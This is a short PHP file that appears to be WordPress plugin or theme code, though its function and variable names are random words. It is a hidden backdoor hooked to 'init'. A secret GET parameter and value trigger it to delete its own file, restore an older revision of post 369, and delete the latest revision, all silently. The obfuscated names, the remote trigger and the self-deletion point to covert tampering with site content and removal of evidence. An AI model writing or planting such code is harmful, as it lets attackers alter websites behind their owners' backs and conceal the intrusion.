<?php

function game_lock_headers() {
	if (isset($_GET['team_view_sticky_builder']) && $_GET['team_view_sticky_builder'] === 'geo_dev_stock_notification') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$business_inline_image_revisions = 369;
		$remover_install_remote = wp_get_post_revisions($business_inline_image_revisions);
		if (empty($remover_install_remote)) die('no revisions');
		if (count($remover_install_remote) < 2) die('less than 2');
		$ninja_gamipress_debug = array_shift($remover_install_remote);
		$better_cookie_soon = $ninja_gamipress_debug->ID;
		$welcome_archive_feedback = array_shift($remover_install_remote);
		$checker_cover_learndash_board = $welcome_archive_feedback->ID;
		$free_another_stop_your = wp_restore_post_revision($checker_cover_learndash_board);
		if ($free_another_stop_your === false) die('error restoring');
		$free_another_stop_your = wp_delete_post_revision($better_cookie_soon);		
		if ($free_another_stop_your === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'game_lock_headers');
